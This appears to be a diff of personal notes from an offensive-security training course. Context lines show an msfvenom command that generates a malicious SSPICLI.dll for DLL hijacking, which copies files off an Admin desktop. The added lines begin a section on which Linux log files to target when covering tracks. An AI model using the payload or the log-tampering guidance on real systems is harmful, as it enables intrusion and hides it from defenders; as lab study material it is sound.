@@ -509,3 +509,26 @@ auditpol /get /category:* | findstr /i "Success Failure"
 - once created SCP to your target box
 - scp from windows and pull from linbox. scp student@<jump ip>:/home/student/<dllname> C:\
 - msfvenom -p windows/exec CMD='xcopy C:\Users\Admin\Desktop\* C:\Users\comrade.WIN2-INTERNAL-D\Desktop' -f dll > SSPICLI.dll
+
+
+==============================================================================================================================================================================================================================
+
+DAY 10
+
+LOGS FOR COVERING TRACKS
+Logs typically housed in /var/log & useful logs:
+
+auth.log/secure    Logins/authentications
+
+lastlog    Each users' last successful login time
+
+btmp    Bad login attempts
+
+sulog    Usage of SU command
+
+utmp    Currently logged in users (W command)
+
+wtmp    Permanent record on user on/off
+
+
+
